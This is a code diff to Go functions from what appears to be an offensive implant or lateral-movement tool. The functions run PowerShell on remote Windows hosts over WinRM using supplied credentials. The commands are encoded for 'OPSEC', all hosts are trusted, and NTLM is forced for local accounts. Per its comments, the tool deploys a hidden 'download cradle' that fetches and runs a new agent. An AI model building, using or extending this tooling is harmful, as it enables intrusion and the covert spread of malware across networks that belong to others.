@@ -23,17 +23,20 @@ func utf16LEBase64(s string) string {
 // winrmExec executes cmd on a remote Windows host using PowerShell Invoke-Command
 // over WinRM/PSRemoting. Credentials are passed via a PSCredential object and the
 // command is base64-encoded to keep it off the process command line (OPSEC).
+// Resolves target to IPv4 first so NTLM is used (Kerberos rejects local accounts).
 func winrmExec(target, user, pass, cmd string) (string, error) {
 	// Build the PowerShell script that wraps Invoke-Command.
 	// The inner command is itself encoded to avoid quoting hell.
 	innerB64 := utf16LEBase64(cmd)
 	script := fmt.Sprintf(`
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force -EA SilentlyContinue
+try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}catch{$ip='%s'}
 $pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
-Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock {
+Invoke-Command -ComputerName $ip -Credential $cred -ScriptBlock {
     powershell -NonInteractive -EncodedCommand %s
 }
-`, escapePS(pass), escapePS(user), escapePS(target), innerB64)
+`, escapePS(target), escapePS(target), escapePS(pass), escapePS(user), innerB64)
 
 	encoded := utf16LEBase64(script)
 	out, err := runShell(fmt.Sprintf(
@@ -47,16 +50,19 @@ Invoke-Command -ComputerName '%s' -Credential $cred -ScriptBlock {
 
 // winrmDeploy runs a PowerShell payload on a remote host via WinRM.
 // payload is typically a download cradle that fetches and executes a new agent.
+// Resolves target to IPv4 first so NTLM is used (Kerberos rejects local accounts).
 func winrmDeploy(target, user, pass, payload string) (string, error) {
 	// Encode the payload so it survives quoting inside Invoke-Command.
 	payloadB64 := utf16LEBase64(payload)
 	script := fmt.Sprintf(`
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force -EA SilentlyContinue
+try{$ip=[System.Net.Dns]::GetHostAddresses('%s')[0].IPAddressToString}catch{$ip='%s'}
 $pw = ConvertTo-SecureString -String '%s' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('%s', $pw)
-Invoke-Command -ComputerName '%s' -Credential $cred -AsJob -ScriptBlock {
+Invoke-Command -ComputerName $ip -Credential $cred -AsJob -ScriptBlock {
     powershell -NonInteractive -WindowStyle Hidden -EncodedCommand %s
 } | Out-Null
-`, escapePS(pass), escapePS(user), escapePS(target), payloadB64)
+`, escapePS(target), escapePS(target), escapePS(pass), escapePS(user), payloadB64)
 
 	encoded := utf16LEBase64(script)
 	out, err := runShell(fmt.Sprintf(
